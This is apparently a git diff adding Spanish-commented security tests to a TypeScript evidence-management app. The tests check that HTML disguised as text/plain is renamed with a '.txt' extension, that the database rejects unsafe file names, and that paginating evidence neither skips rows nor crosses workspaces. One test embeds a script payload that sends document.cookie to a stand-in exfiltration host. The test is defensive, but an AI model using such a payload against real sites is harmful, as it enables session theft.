@@ -11,6 +11,7 @@ import {
   listarBandeja,
   listarEvidencias,
   listarEvidenciaConDerechos,
+  PAGINA_DERECHOS,
 } from '@/lib/evidencia/evidencia.servicio';
 import { marcarItem, ErrorMetodo } from '@/lib/metodo/metodo.servicio';
 import { bytesABase64, MAX_ARCHIVOS_POR_ITEM } from '@/lib/evidencia/sanitizacion';
@@ -494,6 +495,53 @@ describeAuthz('evidencia profunda: derechos bloqueantes, adjuntos y sanitizació
     ).rejects.toThrow(ErrorCuraduria);
   });
 
+  it('la extensión guardada la fija el FORMATO verificado, no quien llama', async () => {
+    // El ataque completo, por el camino real: HTML en UTF-8 declarado `text/plain`.
+    // `verificarArchivo` lo acepta —es texto legítimo: sin controles ni bidi— y antes el
+    // sufijo `.html` llegaba intacto a la base. La descarga fuerza octet-stream, pero
+    // escribe el fichero en disco con ese nombre: abrirlo desde ahí es un origen file://
+    // donde el navegador decide por la extensión y ejecuta el script.
+    const item = await crearItem(leadId, {
+      workspaceId: ws,
+      titulo: 'Material con nombre ejecutable',
+      contenido: 'x',
+      tipoFuente: 'documento',
+      referencia: '',
+    });
+    const html = new TextEncoder().encode(
+      '<html><script>fetch("https://exfil.example/"+document.cookie)</script></html>',
+    );
+    const r = await adjuntarArchivo(leadId, {
+      workspaceId: ws,
+      itemId: item.itemId,
+      nombre: 'payload.html',
+      tipoMime: 'text/plain',
+      contenidoBase64: bytesABase64(html),
+    });
+    const bajado = await archivoParaDescarga(leadId, ws, r.archivoId);
+    // El nombre original se conserva entero (es trazabilidad de quien aportó el
+    // material); lo que cambia es la extensión FINAL, la única que el sistema mira.
+    expect(bajado?.nombre).toBe('payload.html.txt');
+    // Y los bytes siguen siendo los mismos: no se sanea el contenido, se desarma el
+    // vector (el material de terceros se guarda crudo — RF-03.2).
+    expect(bajado?.contenidoBase64).toBe(bytesABase64(html));
+
+    // Y por SQL CRUDO del rol de aplicación: la regla vive en un CHECK, no solo en la
+    // app. Sin esto la promesa de la allowlist sería una convención del servicio.
+    await expect(
+      conUsuario(leadId, (tx) => tx`insert into archivo_importado
+        (workspace_id, item_id, nombre, tipo_mime, contenido, creado_por)
+        values (${ws}, ${item.itemId}, 'payload.html', 'text/plain', 'hola'::bytea, ${leadId})`),
+    ).rejects.toMatchObject({ code: '23514' });
+    // Tampoco una extensión de OTRO formato de la allowlist: `.pdf` con bytes de texto
+    // sigue siendo un nombre que miente sobre lo que hay dentro.
+    await expect(
+      conUsuario(leadId, (tx) => tx`insert into archivo_importado
+        (workspace_id, item_id, nombre, tipo_mime, contenido, creado_por)
+        values (${ws}, ${item.itemId}, 'nota.pdf', 'text/plain', 'hola'::bytea, ${leadId})`),
+    ).rejects.toMatchObject({ code: '23514' });
+  });
+
   it('el esquema también rechaza formatos y nombres inseguros por SQL crudo', async () => {
     const item = await crearItem(leadId, {
       workspaceId: ws,
@@ -559,6 +607,68 @@ describeAuthz('evidencia profunda: derechos bloqueantes, adjuntos y sanitizació
         (workspace_id, titulo, contenido, tipo_fuente, creado_por)
         values (${ws}, 'con bidi ' || chr(8238), 'texto', 'nota', ${leadId})`),
     ).rejects.toMatchObject({ code: '23514' });
+  });
+
+  // ── Paginación de la pantalla de derechos ──
+
+  it('toda la evidencia es alcanzable paginando: la vieja no queda fuera para siempre', async () => {
+    // Sin cursor, un tope duro no «recorta una lista»: deja evidencia PERMANENTEMENTE
+    // fuera de la única pantalla donde se conceden y revocan derechos. Y como los
+    // derechos nacen pendientes (fail-closed), esa evidencia queda además incitable e
+    // inexportable sin camino de reparación. Se siembra una página entera de más.
+    const admin = sqlAdmin();
+    const sobrantes = PAGINA_DERECHOS + 1;
+    await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
+      select ${ws}, 'nota', 'pag-' || g, ${leadId} from generate_series(1, ${sobrantes}) g`;
+    // now() es fijo dentro de la sentencia: todas comparten `creado_en` y el desempate
+    // recae en el id — que es justo el caso que un keyset `(creado_en, id)` tiene que
+    // resolver sin repetir ni saltar filas.
+    const nuevas = await admin`insert into evidencia
+      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
+      select ${ws}, f.id, 'Evidencia ' || f.titulo, '{}'::jsonb, ${leadId}
+      from fuente f where f.workspace_id = ${ws} and f.titulo like 'pag-%'
+      returning id`;
+    await admin`insert into derecho_uso (workspace_id, evidencia_id, creado_por)
+      select ${ws}, e.id, ${leadId} from evidencia e
+      where e.id in ${admin(nuevas.map((f) => f.id as string))}`;
+
+    const primera = await listarEvidenciaConDerechos(leadId, ws);
+    expect(primera.evidencias).toHaveLength(PAGINA_DERECHOS);
+    expect(primera.hayMas).toBe(true);
+
+    const vistas: string[] = [...primera.evidencias.map((e) => e.id)];
+    let cursor = primera.evidencias[primera.evidencias.length - 1]!.id;
+    let hayMas = primera.hayMas;
+    for (let vuelta = 0; hayMas && vuelta < 20; vuelta += 1) {
+      const pagina = await listarEvidenciaConDerechos(leadId, ws, cursor);
+      expect(pagina.evidencias.length).toBeGreaterThan(0);
+      vistas.push(...pagina.evidencias.map((e) => e.id));
+      cursor = pagina.evidencias[pagina.evidencias.length - 1]!.id;
+      hayMas = pagina.hayMas;
+    }
+    expect(hayMas).toBe(false);
+
+    // Ni repetidas ni saltadas: el recorrido completo es EXACTAMENTE la evidencia del
+    // workspace, que es lo que convierte «hay más» en una promesa cumplible.
+    const todas = (await admin`select id from evidencia where workspace_id = ${ws}`).map(
+      (f) => f.id as string,
+    );
+    expect(new Set(vistas).size).toBe(vistas.length);
+    expect(new Set(vistas)).toEqual(new Set(todas));
+
+    // El cursor no es una vía de escape del tenant: pedir la página siguiente con el id
+    // de una evidencia de otro workspace no devuelve nada de aquel ni de este.
+    const [ajena] = await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
+      values (${wsB}, 'nota', 'ajena', ${leadId}) returning id`;
+    const [evAjena] = await admin`insert into evidencia
+      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
+      values (${wsB}, ${ajena!.id as string}, 'Ajena', '{}'::jsonb, ${leadId}) returning id`;
+    const conCursorAjeno = await listarEvidenciaConDerechos(
+      leadId,
+      ws,
+      evAjena!.id as string,
+    );
+    expect(conCursorAjeno.evidencias).toHaveLength(0);
   });
 
   it('marcar cumplido sin evidencia sigue siendo imposible (el guard no lo relaja)', async () => {
